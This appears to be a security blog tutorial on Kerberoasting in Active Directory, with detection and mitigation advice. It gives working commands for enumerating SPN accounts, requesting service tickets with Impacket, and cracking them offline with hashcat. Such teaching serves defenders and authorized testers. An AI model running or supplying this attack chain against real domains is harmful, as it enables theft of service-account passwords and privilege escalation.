---
title: "Kerberoasting Explained: Cracking Service Accounts in Active Directory"
description: "A practical, end-to-end look at Kerberoasting — how it works at the protocol level, how to execute it, and how blue teams can detect and prevent it."
date: 2026-06-22 09:00:00 +0000
categories: [Active Directory]
tags: [active-directory, kerberos, red-team, windows, bloodhound]
difficulty: Medium
---

> Performed in a personal lab. Only run these techniques against systems you are
> explicitly authorized to test.

Kerberoasting is one of the highest-value techniques in an internal engagement: it
requires only a **standard domain user** and can yield cleartext service-account
passwords — often with elevated privileges. Let's break down why it works.

## Why Kerberoasting works

In Kerberos, when a user requests access to a service, the Domain Controller issues a
**TGS (service ticket)** encrypted with the **NTLM hash of the service account** tied to
that Service Principal Name (SPN). Crucially, the DC will issue this ticket to *any*
authenticated user — it doesn't check whether you're allowed to use the service.

That means an attacker can request tickets for SPN-linked accounts and take the encrypted
blobs **offline** to brute-force the password. No lockouts, no noisy authentication.

## Step 1 — Find kerberoastable accounts

Any account with an SPN set is a candidate. From a domain-joined context:

```powershell
# Built-in, no tools needed
setspn -T corp.local -Q */*

# Or with PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

BloodHound will also flag these under the **"Kerberoastable Users"** pre-built query,
which helps prioritize high-privilege targets.

## Step 2 — Request and extract tickets

Using Impacket from a Linux attack box with valid domain creds:

```bash
impacket-GetUserSPNs corp.local/lowpriv:'Password123' \
  -dc-ip 10.10.10.5 -request -outputfile hashes.kerberoast
```

Each line in `hashes.kerberoast` is a `$krb5tgs$` hash ready for cracking.

## Step 3 — Crack offline

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

Service accounts are notorious for weak, non-rotated passwords set years ago — which is
exactly why this attack remains so effective.

## Detection and defense

For defenders, the signal is in the ticket requests:

- Monitor **Event ID 4769** (TGS requests), especially with **RC4 (0x17)** encryption,
  which older/weaker configs still allow.
- Use **Group Managed Service Accounts (gMSA)** — 120-character, auto-rotated passwords
  that are effectively uncrackable.
- Enforce **AES-only** Kerberos where possible and audit SPNs on privileged accounts.

| Weakness | Mitigation |
|---|---|
| Weak service passwords | gMSA / 25+ char passwords |
| RC4 tickets | Enforce AES128/256 |
| Over-privileged SPN accounts | Least privilege + tiering |

## Wrap-up

Kerberoasting endures because it abuses Kerberos working *as designed*. The fix isn't a
patch — it's **password hygiene, gMSA, and encryption policy.** Understanding the protocol
flow is what turns this from a memorized command into a repeatable skill.
